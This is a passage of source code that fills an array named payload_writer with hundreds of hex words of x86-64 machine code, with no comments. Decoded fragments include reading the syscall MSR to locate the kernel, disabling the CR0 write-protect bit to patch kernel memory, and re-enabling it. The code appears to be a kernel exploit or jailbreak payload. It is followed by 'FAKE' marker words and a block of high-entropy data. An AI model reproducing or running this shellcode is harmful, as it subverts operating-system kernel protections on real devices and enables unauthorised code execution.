  payload_writer[1085] = 0x15894802;
  payload_writer[1086] = 0x00000FD0;
  payload_writer[1087] = 0x80908D48;
  payload_writer[1088] = 0x480267B4;
  payload_writer[1089] = 0x0FBA1589;
  payload_writer[1090] = 0x8D480000;
  payload_writer[1091] = 0x20734090;
  payload_writer[1092] = 0x15894800;
  payload_writer[1093] = 0x0000105C;
  payload_writer[1094] = 0x70908D48;
  payload_writer[1095] = 0x48001ADE;
  payload_writer[1096] = 0x10461589;
  payload_writer[1097] = 0x8D480000;
  payload_writer[1098] = 0x1AE03090;
  payload_writer[1099] = 0x15894800;
  payload_writer[1100] = 0x00001030;
  payload_writer[1101] = 0x80908D48;
  payload_writer[1102] = 0x48003016;
  payload_writer[1103] = 0x101A1589;
  payload_writer[1104] = 0x8D480000;
  payload_writer[1105] = 0x30188090;
  payload_writer[1106] = 0x15894800;
  payload_writer[1107] = 0x00001004;
  payload_writer[1108] = 0x80908D48;
  payload_writer[1109] = 0x48000055;
  payload_writer[1110] = 0x0FEE1589;
  payload_writer[1111] = 0x8D480000;
  payload_writer[1112] = 0x2CEA3090;
  payload_writer[1113] = 0x15894800;
  payload_writer[1114] = 0x00000FD8;
  payload_writer[1115] = 0x20908D48;
  payload_writer[1116] = 0x48002CEB;
  payload_writer[1117] = 0x0FC21589;
  payload_writer[1118] = 0x8D480000;
  payload_writer[1119] = 0x02EE8090;
  payload_writer[1120] = 0x15894800;
  payload_writer[1121] = 0x00000FAC;
  payload_writer[1122] = 0x60908D48;
  payload_writer[1123] = 0x48002DFA;
  payload_writer[1124] = 0x0F961589;
  payload_writer[1125] = 0x8D480000;
  payload_writer[1126] = 0x093E3090;
  payload_writer[1127] = 0x15894800;
  payload_writer[1128] = 0x00000F80;
  payload_writer[1129] = 0x70908D48;
  payload_writer[1130] = 0x48000BC5;
  payload_writer[1131] = 0x0F6A1589;
  payload_writer[1132] = 0x8D480000;
  payload_writer[1133] = 0x48365090;
  payload_writer[1134] = 0x15894800;
  payload_writer[1135] = 0x00000F54;
  payload_writer[1136] = 0x70908D48;
  payload_writer[1137] = 0x48001CB7;
  payload_writer[1138] = 0x0EEE1589;
  payload_writer[1139] = 0x8D480000;
  payload_writer[1140] = 0x64BF5090;
  payload_writer[1141] = 0x15894800;
  payload_writer[1142] = 0x00000ED8;
  payload_writer[1143] = 0x50908D48;
  payload_writer[1144] = 0x48006600;
  payload_writer[1145] = 0x0EC21589;
  payload_writer[1146] = 0x8D480000;
  payload_writer[1147] = 0x6608D090;
  payload_writer[1148] = 0x15894800;
  payload_writer[1149] = 0x00000EAC;
  payload_writer[1150] = 0xA0908D48;
  payload_writer[1151] = 0x480065A3;
  payload_writer[1152] = 0x0E961589;
  payload_writer[1153] = 0x8D480000;
  payload_writer[1154] = 0x65C18090;
  payload_writer[1155] = 0x15894800;
  payload_writer[1156] = 0x00000E80;
  payload_writer[1157] = 0x40908D48;
  payload_writer[1158] = 0x4800646E;
  payload_writer[1159] = 0x0E421589;
  payload_writer[1160] = 0x8D480000;
  payload_writer[1161] = 0x64881090;
  payload_writer[1162] = 0x15894800;
  payload_writer[1163] = 0x00000E1C;
  payload_writer[1164] = 0x90908D48;
  payload_writer[1165] = 0x48006484;
  payload_writer[1166] = 0x0E161589;
  payload_writer[1167] = 0x8D480000;
  payload_writer[1168] = 0x63E07090;
  payload_writer[1169] = 0x15894800;
  payload_writer[1170] = 0x00000E10;
  payload_writer[1171] = 0x60908D48;
  payload_writer[1172] = 0x48006480;
  payload_writer[1173] = 0x0DEA1589;
  payload_writer[1174] = 0x8D480000;
  payload_writer[1175] = 0x6374E090;
  payload_writer[1176] = 0x15894800;
  payload_writer[1177] = 0x00000E04;
  payload_writer[1178] = 0x80908D48;
  payload_writer[1179] = 0x48001DD3;
  payload_writer[1180] = 0x0E161589;
  payload_writer[1181] = 0x8D480000;
  payload_writer[1182] = 0x1DA25090;
  payload_writer[1183] = 0x15894800;
  payload_writer[1184] = 0x00000DF8;
  payload_writer[1185] = 0x80908D48;
  payload_writer[1186] = 0x48001DA4;
  payload_writer[1187] = 0x0DE21589;
  payload_writer[1188] = 0x8D480000;
  payload_writer[1189] = 0x205D9090;
  payload_writer[1190] = 0x15894800;
  payload_writer[1191] = 0x00000DE4;
  payload_writer[1192] = 0xC0908D48;
  payload_writer[1193] = 0x4800043C;
  payload_writer[1194] = 0x0D661589;
  payload_writer[1195] = 0x8D480000;
  payload_writer[1196] = 0x25F83090;
  payload_writer[1197] = 0x15894800;
  payload_writer[1198] = 0x00000D80;
  payload_writer[1199] = 0x60908D48;
  payload_writer[1200] = 0x480025F6;
  payload_writer[1201] = 0x0D6A1589;
  payload_writer[1202] = 0x8D480000;
  payload_writer[1203] = 0x25F9D090;
  payload_writer[1204] = 0x15894800;
  payload_writer[1205] = 0x00000D54;
  payload_writer[1206] = 0x20908D48;
  payload_writer[1207] = 0x480025FA;
  payload_writer[1208] = 0x25FFD005;
  payload_writer[1209] = 0x15894800;
  payload_writer[1210] = 0x00000D38;
  payload_writer[1211] = 0x29058948;
  payload_writer[1212] = 0xC300000D;
  payload_writer[1213] = 0xE8C03150;
  payload_writer[1214] = 0xFFFFFD74;
  payload_writer[1215] = 0xFFFCC7E8;
  payload_writer[1216] = 0xF762E8FF;
  payload_writer[1217] = 0xB1E8FFFF;
  payload_writer[1218] = 0x5A000007;
  payload_writer[1219] = 0x00026DE9;
  payload_writer[1220] = 0x358B4800;
  payload_writer[1221] = 0x00000DF4;
  payload_writer[1222] = 0x0E3625FF;
  payload_writer[1223] = 0x8B480000;
  payload_writer[1224] = 0x000DD705;
  payload_writer[1225] = 0x55544100;
  payload_writer[1226] = 0xFB894853;
  payload_writer[1227] = 0x48208B4C;
  payload_writer[1228] = 0x0E3E2D8B;
  payload_writer[1229] = 0x89480000;
  payload_writer[1230] = 0xE515FFDF;
  payload_writer[1231] = 0x4900000D;
  payload_writer[1232] = 0x5424BC8D;
  payload_writer[1233] = 0x48000004;
  payload_writer[1234] = 0x8948DE89;
  payload_writer[1235] = 0x85D5FFC2;
  payload_writer[1236] = 0x4D0974C0;
  payload_writer[1237] = 0x4D24248B;
  payload_writer[1238] = 0xD375E485;
  payload_writer[1239] = 0xE0894C5B;
  payload_writer[1240] = 0xC35C415D;
  payload_writer[1241] = 0x56415741;
  payload_writer[1242] = 0x54415541;
  payload_writer[1243] = 0x83485355;
  payload_writer[1244] = 0x894938EC;
  payload_writer[1245] = 0x44C748D6;
  payload_writer[1246] = 0x00002824;
  payload_writer[1247] = 0x83410000;
  payload_writer[1248] = 0x8948FFCD;
  payload_writer[1249] = 0xFF082474;
  payload_writer[1250] = 0x000CAF15;
  payload_writer[1251] = 0xC0854800;
  payload_writer[1252] = 0x0117840F;
  payload_writer[1253] = 0x8B440000;
  payload_writer[1254] = 0x000100A0;
  payload_writer[1255] = 0xC5894800;
  payload_writer[1256] = 0x45C78948;
  payload_writer[1257] = 0x0E75E485;
  payload_writer[1258] = 0x0C8615FF;
  payload_writer[1259] = 0x31450000;
  payload_writer[1260] = 0x00F7E9ED;
  payload_writer[1261] = 0x15FF0000;
  payload_writer[1262] = 0x00000C70;
  payload_writer[1263] = 0x8D48F631;
  payload_writer[1264] = 0x48282454;
  payload_writer[1265] = 0x15FFEF89;
  payload_writer[1266] = 0x00000C50;
  payload_writer[1267] = 0x8941C085;
  payload_writer[1268] = 0x482E75C5;
  payload_writer[1269] = 0x0D32358B;
  payload_writer[1270] = 0x89440000;
  payload_writer[1271] = 0x06E7C1E7;
  payload_writer[1272] = 0x000002BA;
  payload_writer[1273] = 0xFC634D00;
  payload_writer[1274] = 0x0D6E15FF;
  payload_writer[1275] = 0x85480000;
  payload_writer[1276] = 0xC38948C0;
  payload_writer[1277] = 0x89480B74;
  payload_writer[1278] = 0xC93145C1;
  payload_writer[1279] = 0x00008AE9;
  payload_writer[1280] = 0xEF894800;
  payload_writer[1281] = 0xFFCD8341;
  payload_writer[1282] = 0x0C1615FF;
  payload_writer[1283] = 0x89480000;
  payload_writer[1284] = 0x1D15FFEF;
  payload_writer[1285] = 0xE900000C;
  payload_writer[1286] = 0x00000091;
  payload_writer[1287] = 0x24748B48;
  payload_writer[1288] = 0x4C894428;
  payload_writer[1289] = 0x89481C24;
  payload_writer[1290] = 0x4810244C;
  payload_writer[1291] = 0x8B48CF89;
  payload_writer[1292] = 0x81482046;
  payload_writer[1293] = 0x00008DC6;
  payload_writer[1294] = 0x41894800;
  payload_writer[1295] = 0x468B4820;
  payload_writer[1296] = 0x4189489B;
  payload_writer[1297] = 0x468B4828;
  payload_writer[1298] = 0x418948C3;
  payload_writer[1299] = 0xCF568B30;
  payload_writer[1300] = 0xC166D089;
  payload_writer[1301] = 0xD02108E8;
  payload_writer[1302] = 0x000020BA;
  payload_writer[1303] = 0x41896600;
  payload_writer[1304] = 0xCD15FF38;
  payload_writer[1305] = 0x4800000C;
  payload_writer[1306] = 0x2824448B;
  payload_writer[1307] = 0x244C8B48;
  payload_writer[1308] = 0x4C8B4410;
  payload_writer[1309] = 0x8B481C24;
  payload_writer[1310] = 0x83480840;
  payload_writer[1311] = 0x854840C1;
  payload_writer[1312] = 0x448948C0;
  payload_writer[1313] = 0x08742824;
  payload_writer[1314] = 0x45C1FF41;
  payload_writer[1315] = 0x8C7CE139;
  payload_writer[1316] = 0xFFEF8948;
  payload_writer[1317] = 0x000B8B15;
  payload_writer[1318] = 0xEF894800;
  payload_writer[1319] = 0x0B9215FF;
  payload_writer[1320] = 0x8B480000;
  payload_writer[1321] = 0x48082444;
  payload_writer[1322] = 0x894D1889;
  payload_writer[1323] = 0xC483483E;
  payload_writer[1324] = 0xE8894438;
  payload_writer[1325] = 0x5C415D5B;
  payload_writer[1326] = 0x5E415D41;
  payload_writer[1327] = 0x41C35F41;
  payload_writer[1328] = 0x41564157;
  payload_writer[1329] = 0x55544155;
  payload_writer[1330] = 0xEC834853;
  payload_writer[1331] = 0xCE894958;
  payload_writer[1332] = 0x0C8B4865;
  payload_writer[1333] = 0x00000025;
  payload_writer[1334] = 0xFFC88300;
  payload_writer[1335] = 0x48FF8548;
  payload_writer[1336] = 0x08244C89;
  payload_writer[1337] = 0x0085840F;
  payload_writer[1338] = 0x89480000;
  payload_writer[1339] = 0x7C8D4CD3;
  payload_writer[1340] = 0x894D1024;
  payload_writer[1341] = 0xFD8948C4;
  payload_writer[1342] = 0xBAF58949;
  payload_writer[1343] = 0x00000010;
  payload_writer[1344] = 0x894CF631;
  payload_writer[1345] = 0x2115FFFF;
  payload_writer[1346] = 0x4C00000C;
  payload_writer[1347] = 0x10247489;
  payload_writer[1348] = 0x24748D4C;
  payload_writer[1349] = 0x5C894820;
  payload_writer[1350] = 0x30BA1824;
  payload_writer[1351] = 0x31000000;
  payload_writer[1352] = 0xF7894CF6;
  payload_writer[1353] = 0x0C0215FF;
  payload_writer[1354] = 0x8B480000;
  payload_writer[1355] = 0x4808244C;
  payload_writer[1356] = 0x000001B8;
  payload_writer[1357] = 0x00000100;
  payload_writer[1358] = 0x5C894800;
  payload_writer[1359] = 0x894C3824;
  payload_writer[1360] = 0x4C20247C;
  payload_writer[1361] = 0x44C7F689;
  payload_writer[1362] = 0x00012824;
  payload_writer[1363] = 0x89480000;
  payload_writer[1364] = 0x6C894CEF;
  payload_writer[1365] = 0x89483024;
  payload_writer[1366] = 0x48402444;
  payload_writer[1367] = 0x48244C89;
  payload_writer[1368] = 0x0AAE15FF;
  payload_writer[1369] = 0x2B480000;
  payload_writer[1370] = 0x4938245C;
  payload_writer[1371] = 0x48241C89;
  payload_writer[1372] = 0x5B58C483;
  payload_writer[1373] = 0x415C415D;
  payload_writer[1374] = 0x415E415D;
  payload_writer[1375] = 0x5641C35F;
  payload_writer[1376] = 0x54415541;
  payload_writer[1377] = 0x8D485355;
  payload_writer[1378] = 0x000A5F35;
  payload_writer[1379] = 0xEC834800;
  payload_writer[1380] = 0x0008B950;
  payload_writer[1381] = 0x8D480000;
  payload_writer[1382] = 0x4830247C;
  payload_writer[1383] = 0x202444C7;
  payload_writer[1385] = 0x2444C748;
  payload_writer[1386] = 0x00000028;
  payload_writer[1387] = 0x2444C700;
  payload_writer[1388] = 0xFFC03113;
  payload_writer[1389] = 0x2444C6C0;
  payload_writer[1390] = 0xA5F39017;
  payload_writer[1391] = 0x513D8D48;
  payload_writer[1392] = 0xE8000009;
  payload_writer[1393] = 0xFFFFFD56;
  payload_writer[1394] = 0x75C08548;
  payload_writer[1395] = 0xFFC88308;
  payload_writer[1396] = 0x000153E9;
  payload_writer[1397] = 0x548D4800;
  payload_writer[1398] = 0x8D482824;
  payload_writer[1399] = 0x48202474;
  payload_writer[1400] = 0x8948C789;
  payload_writer[1401] = 0xFD7AE8C5;
  payload_writer[1402] = 0xC085FFFF;
  payload_writer[1403] = 0x0136850F;
  payload_writer[1404] = 0x8B480000;
  payload_writer[1405] = 0x4C282474;
  payload_writer[1406] = 0x30246C8D;
  payload_writer[1407] = 0x24548B48;
  payload_writer[1408] = 0x48C03120;
  payload_writer[1409] = 0xC574C639;
  payload_writer[1410] = 0x48D18948;
  payload_writer[1411] = 0x8348C0FF;
  payload_writer[1412] = 0x836640C2;
  payload_writer[1413] = 0x75053879;
  payload_writer[1414] = 0x598B48EA;
  payload_writer[1415] = 0xDB854820;
  payload_writer[1416] = 0x3145AB74;
  payload_writer[1417] = 0x648D4CF6;
  payload_writer[1418] = 0x8B431824;
  payload_writer[1419] = 0x4D00B574;
  payload_writer[1420] = 0x8D48E089;
  payload_writer[1421] = 0x0008E80D;
  payload_writer[1422] = 0x0005BA00;
  payload_writer[1423] = 0x89480000;
  payload_writer[1424] = 0xDE0148EF;
  payload_writer[1425] = 0xFFFE76E8;
  payload_writer[1426] = 0x0FC085FF;
  payload_writer[1427] = 0x0000D785;
  payload_writer[1428] = 0xC6FF4900;
  payload_writer[1429] = 0x08FE8349;
  payload_writer[1430] = 0x8D48D075;
  payload_writer[1431] = 0x4813244C;
  payload_writer[1432] = 0x8FE1B38D;
  payload_writer[1433] = 0x894D0031;
  payload_writer[1434] = 0x0005BAE0;
  payload_writer[1435] = 0x89480000;
  payload_writer[1436] = 0xFE49E8EF;
  payload_writer[1437] = 0xC085FFFF;
  payload_writer[1438] = 0x00AA850F;
  payload_writer[1439] = 0x8D480000;
  payload_writer[1440] = 0x3C5900B3;
  payload_writer[1441] = 0xE0894D00;
  payload_writer[1442] = 0x3D0D8D48;
  payload_writer[1443] = 0xBA000009;
  payload_writer[1444] = 0x00000008;
  payload_writer[1445] = 0xE8EF8948;
  payload_writer[1446] = 0xFFFFFE23;
  payload_writer[1447] = 0x850FC085;
  payload_writer[1448] = 0x00000084;
  payload_writer[1449] = 0xB1B38D48;
  payload_writer[1450] = 0x4D00F5E9;
  payload_writer[1451] = 0x8D48E089;
  payload_writer[1452] = 0x0009200D;
  payload_writer[1453] = 0x0005BA00;
  payload_writer[1454] = 0x89480000;
  payload_writer[1455] = 0xFDFDE8EF;
  payload_writer[1456] = 0xC085FFFF;
  payload_writer[1457] = 0x8D486275;
  payload_writer[1458] = 0x9B6C41B3;
  payload_writer[1459] = 0xE0894D00;
  payload_writer[1460] = 0x040D8D48;
  payload_writer[1461] = 0xBA000009;
  payload_writer[1462] = 0x00000001;
  payload_writer[1463] = 0xE8EF8948;
  payload_writer[1464] = 0xFFFFFDDB;
  payload_writer[1465] = 0x4075C085;
  payload_writer[1466] = 0xADB38D48;
  payload_writer[1467] = 0x4D005C6A;
  payload_writer[1468] = 0x8D48E089;
  payload_writer[1469] = 0x00082E0D;
  payload_writer[1470] = 0x0001BA00;
  payload_writer[1471] = 0x89480000;
  payload_writer[1472] = 0xFDB9E8EF;
  payload_writer[1473] = 0xC085FFFF;
  payload_writer[1474] = 0x8D481E75;
  payload_writer[1475] = 0x13CF20B3;
  payload_writer[1476] = 0xE0894D00;
  payload_writer[1477] = 0x0C0D8D48;
  payload_writer[1478] = 0xBA000008;
  payload_writer[1479] = 0x00000001;
  payload_writer[1480] = 0xE8EF8948;
  payload_writer[1481] = 0xFFFFFD97;
  payload_writer[1482] = 0x247C8B48;
  payload_writer[1483] = 0xFF854820;
  payload_writer[1484] = 0x44890D74;
  payload_writer[1485] = 0xD6E80C24;
  payload_writer[1486] = 0x8BFFFFFB;
  payload_writer[1487] = 0x480C2444;
  payload_writer[1488] = 0x5B50C483;
  payload_writer[1489] = 0x415C415D;
  payload_writer[1490] = 0xC35E415D;
  payload_writer[1491] = 0x55415641;
  payload_writer[1492] = 0x53555441;
  payload_writer[1493] = 0xCE3D8D48;
  payload_writer[1494] = 0x48000007;
  payload_writer[1495] = 0x4830EC83;
  payload_writer[1496] = 0x202444C7;
  payload_writer[1498] = 0x2444C748;
  payload_writer[1499] = 0x00000028;
  payload_writer[1500] = 0x2444C700;
  payload_writer[1501] = 0x0001B812;
  payload_writer[1502] = 0x44C76600;
  payload_writer[1503] = 0xC3001624;
  payload_writer[1504] = 0xFFFB99E8;
  payload_writer[1505] = 0xC08548FF;
  payload_writer[1506] = 0xC8830875;
  payload_writer[1507] = 0x019EE9FF;
  payload_writer[1508] = 0x8D480000;
  payload_writer[1509] = 0x48282454;
  payload_writer[1510] = 0x2024748D;
  payload_writer[1511] = 0x48C78948;
  payload_writer[1512] = 0xBDE8C589;
  payload_writer[1513] = 0x45FFFFFB;
  payload_writer[1514] = 0x8D4CE431;
  payload_writer[1515] = 0x0007832D;
  payload_writer[1516] = 0x0FC08500;
  payload_writer[1517] = 0x00017785;
  payload_writer[1518] = 0x64394C00;
  payload_writer[1519] = 0x8B482824;
  payload_writer[1520] = 0x7620247C;
  payload_writer[1521] = 0xE3894C31;
  payload_writer[1522] = 0x00000ABA;
  payload_writer[1523] = 0xE3C14800;
  payload_writer[1524] = 0xEE894C06;
  payload_writer[1525] = 0xFFDF0148;
  payload_writer[1526] = 0x00099715;
  payload_writer[1527] = 0x75C08500;
  payload_writer[1528] = 0x5C03481F;
  payload_writer[1529] = 0x83662024;
  payload_writer[1530] = 0x7604387B;
  payload_writer[1531] = 0x738B4813;
  payload_writer[1532] = 0xF6854820;
  payload_writer[1533] = 0x01B80F75;
  payload_writer[1534] = 0xE9000000;
  payload_writer[1535] = 0x00000130;
  payload_writer[1536] = 0xEBC4FF49;
  payload_writer[1537] = 0x648D4CB4;
  payload_writer[1538] = 0x81481824;
  payload_writer[1539] = 0x191220C6;
  payload_writer[1540] = 0xE0894D00;
  payload_writer[1541] = 0x240D8D48;
  payload_writer[1542] = 0xBA000007;
  payload_writer[1543] = 0x00000004;
  payload_writer[1544] = 0xE8EF8948;
  payload_writer[1545] = 0xFFFFFC97;
  payload_writer[1546] = 0x4CED3145;
  payload_writer[1547] = 0x0712358D;
  payload_writer[1548] = 0xC0850000;
  payload_writer[1549] = 0x00F6850F;
  payload_writer[1550] = 0x394C0000;
  payload_writer[1551] = 0x4828246C;
  payload_writer[1552] = 0x20247C8B;
  payload_writer[1553] = 0x894CB076;
  payload_writer[1554] = 0x000CBAEB;
  payload_writer[1555] = 0xC1480000;
  payload_writer[1556] = 0x894C06E3;
  payload_writer[1557] = 0xDF0148F6;
  payload_writer[1558] = 0x091615FF;
  payload_writer[1559] = 0xC0850000;
  payload_writer[1560] = 0x03484375;
  payload_writer[1561] = 0x6620245C;
  payload_writer[1562] = 0x04387B83;
  payload_writer[1563] = 0x8B483776;
  payload_writer[1564] = 0x85482073;
  payload_writer[1565] = 0x7B840FF6;
  payload_writer[1566] = 0x48FFFFFF;
  payload_writer[1567] = 0xC9A1C681;
  payload_writer[1568] = 0x894D00EC;
  payload_writer[1569] = 0x0D8D48E0;
  payload_writer[1570] = 0x00000780;
  payload_writer[1571] = 0x000005BA;
  payload_writer[1572] = 0xEF894800;
  payload_writer[1573] = 0xE8ED3145;
  payload_writer[1574] = 0xFFFFFC23;
  payload_writer[1575] = 0xAE358D4C;
  payload_writer[1576] = 0xEB000006;
  payload_writer[1577] = 0xC5FF4924;
  payload_writer[1578] = 0x894C90EB;
  payload_writer[1579] = 0x0012BAEB;
  payload_writer[1580] = 0xC1480000;
  payload_writer[1581] = 0x894C06E3;
  payload_writer[1582] = 0xDF0148F6;
  payload_writer[1583] = 0x08B215FF;
  payload_writer[1584] = 0xC0850000;
  payload_writer[1585] = 0xFF491474;
  payload_writer[1586] = 0x6C394CC5;
  payload_writer[1587] = 0x8B482824;
  payload_writer[1588] = 0x7720247C;
  payload_writer[1589] = 0xFEB0E9D5;
  payload_writer[1590] = 0x0348FFFF;
  payload_writer[1591] = 0x6620245C;
  payload_writer[1592] = 0x04387B83;
  payload_writer[1593] = 0x8B48E076;
  payload_writer[1594] = 0x8548205B;
  payload_writer[1595] = 0x97840FDB;
  payload_writer[1596] = 0x4CFFFFFE;
  payload_writer[1597] = 0x12246C8D;
  payload_writer[1598] = 0x40B38D48;
  payload_writer[1599] = 0x4D0001D2;
  payload_writer[1600] = 0x894CE089;
  payload_writer[1601] = 0x0006BAE9;
  payload_writer[1602] = 0x89480000;
  payload_writer[1603] = 0xFBADE8EF;
  payload_writer[1604] = 0xC085FFFF;
  payload_writer[1605] = 0x8D481A75;
  payload_writer[1606] = 0x01D5A0B3;
  payload_writer[1607] = 0xE0894D00;
  payload_writer[1608] = 0xBAE9894C;
  payload_writer[1609] = 0x00000006;
  payload_writer[1610] = 0xE8EF8948;
  payload_writer[1611] = 0xFFFFFB8F;
  payload_writer[1612] = 0x247C8B48;
  payload_writer[1613] = 0xFF854820;
  payload_writer[1614] = 0x44890D74;
  payload_writer[1615] = 0xCEE80C24;
  payload_writer[1616] = 0x8BFFFFF9;
  payload_writer[1617] = 0x480C2444;
  payload_writer[1618] = 0x5B30C483;
  payload_writer[1619] = 0x415C415D;
  payload_writer[1620] = 0xC35E415D;
  payload_writer[1621] = 0x54415541;
  payload_writer[1622] = 0x83485355;
  payload_writer[1623] = 0x8D4838EC;
  payload_writer[1624] = 0x0005FF3D;
  payload_writer[1625] = 0x44C74800;
  payload_writer[1626] = 0x00001824;
  payload_writer[1627] = 0xABE80000;
  payload_writer[1628] = 0x48FFFFF9;
  payload_writer[1629] = 0x0A75C085;
  payload_writer[1630] = 0x000001B8;
  payload_writer[1631] = 0x00B0E900;
  payload_writer[1632] = 0x8D480000;
  payload_writer[1633] = 0x48202454;
  payload_writer[1634] = 0x1824748D;
  payload_writer[1635] = 0x48C78948;
  payload_writer[1636] = 0xCDE8C589;
  payload_writer[1637] = 0x45FFFFF9;
  payload_writer[1638] = 0x8D4CE431;
  payload_writer[1639] = 0x0005932D;
  payload_writer[1640] = 0x75C08500;
  payload_writer[1641] = 0x64394CD3;
  payload_writer[1642] = 0x8B482024;
  payload_writer[1643] = 0x7618247C;
  payload_writer[1644] = 0xE3894CC7;
  payload_writer[1645] = 0x00000ABA;
  payload_writer[1646] = 0xE3C14800;
  payload_writer[1647] = 0xEE894C06;
  payload_writer[1648] = 0xFFDF0148;
  payload_writer[1649] = 0x0007AB15;
  payload_writer[1650] = 0x75C08500;
  payload_writer[1651] = 0x5C034817;
  payload_writer[1652] = 0x83661824;
  payload_writer[1653] = 0x7505387B;
  payload_writer[1654] = 0x5B8B480B;
  payload_writer[1655] = 0xDB854820;
  payload_writer[1656] = 0x94EB0775;
  payload_writer[1657] = 0xEBC4FF49;
  payload_writer[1658] = 0x448D4CBC;
  payload_writer[1659] = 0x8D482824;
  payload_writer[1660] = 0x10B343B3;
  payload_writer[1661] = 0x0D8D4800;
  payload_writer[1662] = 0x00000576;
  payload_writer[1663] = 0x000001BA;
  payload_writer[1664] = 0xEF894800;
  payload_writer[1665] = 0x2444894C;
  payload_writer[1666] = 0xFAB1E808;
  payload_writer[1667] = 0xC085FFFF;
  payload_writer[1668] = 0x8B4C2075;
  payload_writer[1669] = 0x48082444;
  payload_writer[1670] = 0xB35EB38D;
  payload_writer[1671] = 0x8D480010;
  payload_writer[1672] = 0x00054F0D;
  payload_writer[1673] = 0x0002BA00;
  payload_writer[1674] = 0x89480000;
  payload_writer[1675] = 0xFA8DE8EF;
  payload_writer[1676] = 0x8B48FFFF;
  payload_writer[1677] = 0x4818247C;
  payload_writer[1678] = 0x0D74FF85;
  payload_writer[1679] = 0x08244489;
  payload_writer[1680] = 0xFFF8CCE8;
  payload_writer[1681] = 0x24448BFF;
  payload_writer[1682] = 0xC4834808;
  payload_writer[1683] = 0x415D5B38;
  payload_writer[1684] = 0xC35D415C;
  payload_writer[1685] = 0xFCF2E850;
  payload_writer[1686] = 0x315AFFFF;
  payload_writer[1687] = 0xFEF2E9C0;
  payload_writer[1688] = 0x82B9FFFF;
  payload_writer[1689] = 0x0FC00000;
  payload_writer[1690] = 0xC1200F32;
  payload_writer[1691] = 0x48CE8948;
  payload_writer[1692] = 0xFFFFE681;
  payload_writer[1693] = 0x220FFFFE;
  payload_writer[1694] = 0xFA5E9CC6;
  payload_writer[1695] = 0x20E2C148;
  payload_writer[1696] = 0x85C20948;
  payload_writer[1697] = 0x828D48FF;
  payload_writer[1698] = 0x022FEB90;
  payload_writer[1699] = 0x027537B2;
  payload_writer[1700] = 0xFF8524B2;
  payload_writer[1701] = 0xB2365088;
  payload_writer[1702] = 0x31027503;
  payload_writer[1703] = 0x88FF85D2;
  payload_writer[1704] = 0x950F5950;
  payload_writer[1705] = 0x5A5088C2;
  payload_writer[1706] = 0x56785088;
  payload_writer[1707] = 0xC1220F9D;
  payload_writer[1708] = 0xEBFF31C3;
  payload_writer[1709] = 0x0001BFAD;
  payload_writer[1710] = 0xA6EB0000;
  payload_writer[1711] = 0xE8C03150;
  payload_writer[1712] = 0xFFFFFF90;
  payload_writer[1713] = 0xD8F0B941;
  payload_writer[1714] = 0x3145FFFF;
  payload_writer[1715] = 0x0D8D48C0;
  payload_writer[1716] = 0x000004A3;
  payload_writer[1717] = 0xD6158D48;
  payload_writer[1718] = 0x48FFFFFF;
  payload_writer[1719] = 0x04A9358D;
  payload_writer[1720] = 0xFF310000;
  payload_writer[1721] = 0x062A15FF;
  payload_writer[1722] = 0x5A410000;
  payload_writer[1723] = 0x4E20B941;
  payload_writer[1724] = 0x31450000;
  payload_writer[1725] = 0x0D8D48C0;
  payload_writer[1726] = 0x000004A5;
  payload_writer[1727] = 0x51158D48;
  payload_writer[1728] = 0x48FFFFFF;
  payload_writer[1729] = 0x04AA358D;
  payload_writer[1730] = 0xFF310000;
  payload_writer[1731] = 0x060225FF;
  payload_writer[1739] = 0x454B4146;
  payload_writer[1740] = 0x454B4146;
  payload_writer[1741] = 0x454B4146;
  payload_writer[1742] = 0x454B4146;
  payload_writer[1743] = 0x8D26C296;
  payload_writer[1744] = 0x8B1C2669;
  payload_writer[1745] = 0xFF6B3B1E;
  payload_writer[1746] = 0x124EE02F;
  payload_writer[1747] = 0x7EB873F5;
  payload_writer[1748] = 0x877C985C;
  payload_writer[1749] = 0xAEDAF167;
  payload_writer[1750] = 0xAB4BF9A0;
  payload_writer[1751] = 0x64CED877;
  payload_writer[1752] = 0xA64FC16A;
  payload_writer[1753] = 0xCCAAB99B;
  payload_writer[1754] = 0x3FA40976;
  payload_writer[1755] = 0x62F5FAB9;
  payload_writer[1756] = 0x49B80A84;
  payload_writer[1757] = 0xC49EDF02;
  payload_writer[1758] = 0x56D3371A;
  payload_writer[1759] = 0x156EA40D;
  payload_writer[1760] = 0x8DA01507;
  payload_writer[1761] = 0x20929D97;
  payload_writer[1762] = 0xB2C35243;
  payload_writer[1763] = 0xF3D3F7FD;
  payload_writer[1764] = 0x4F28A269;
  payload_writer[1765] = 0x40806F62;
  payload_writer[1766] = 0x1E803B5F;
  payload_writer[1767] = 0x8B0D385E;
  payload_writer[1768] = 0x5856A856;
  payload_writer[1769] = 0xEA6FD9D8;
  payload_writer[1770] = 0x16402A12;
  payload_writer[1771] = 0x273DEDC1;
  payload_writer[1772] = 0x9763A016;
  payload_writer[1773] = 0xCC553961;
  payload_writer[1774] = 0x08FA058A;
  payload_writer[1775] = 0x5655FD28;
  payload_writer[1776] = 0x05659431;
  payload_writer[1777] = 0x6C57D3E7;
  payload_writer[1778] = 0x0B671C0D;
  payload_writer[1779] = 0x3867354D;
  payload_writer[1780] = 0x3B3E90BC;
  payload_writer[1781] = 0xF2BC6CAA;
  payload_writer[1782] = 0xD2459EEB;
  payload_writer[1783] = 0x3ACA2F09;
  payload_writer[1784] = 0xAD36029C;
  payload_writer[1785] = 0xB2B1C12E;
  payload_writer[1786] = 0x6B1F7C6D;
  payload_writer[1787] = 0x20628FA1;
  payload_writer[1788] = 0x366CD68C;
  payload_writer[1789] = 0x9E545AD6;
  payload_writer[1790] = 0x25A8A930;
  payload_writer[1791] = 0x3E12943D;
  payload_writer[1792] = 0xF01B160D;
  payload_writer[1793] = 0xE0724286;
  payload_writer[1794] = 0x68399CD6;
  payload_writer[1795] = 0x968011DB;
  payload_writer[1796] = 0x41712B18;
  payload_writer[1797] = 0x17E87848;
  payload_writer[1798] = 0x1F007D8B;
  payload_writer[1799] = 0x75D26816;
  payload_writer[1800] = 0xF2E0B597;
  payload_writer[1801] = 0xAC750C6D;
  payload_writer[1802] = 0xB1D5D916;
  payload_writer[1803] = 0xD0E88BB5;
  payload_writer[1804] = 0x611FA7BF;
  payload_writer[1805] = 0x68F8085B;
  payload_writer[1806] = 0xBCD1F0E7;
  payload_writer[1807] = 0x55BF6039;
  payload_writer[1808] = 0x30207C9C;
  payload_writer[1809] = 0x442850E8;
  payload_writer[1810] = 0x2A51CE02;
  payload_writer[1811] = 0xFDDB5425;
  payload_writer[1812] = 0x9A974586;
  payload_writer[1813] = 0xE3F0171E;
  payload_writer[1814] = 0x120F92A5;
  payload_writer[1815] = 0xA64C5C2A;
  payload_writer[1816] = 0xE87FCFA5;
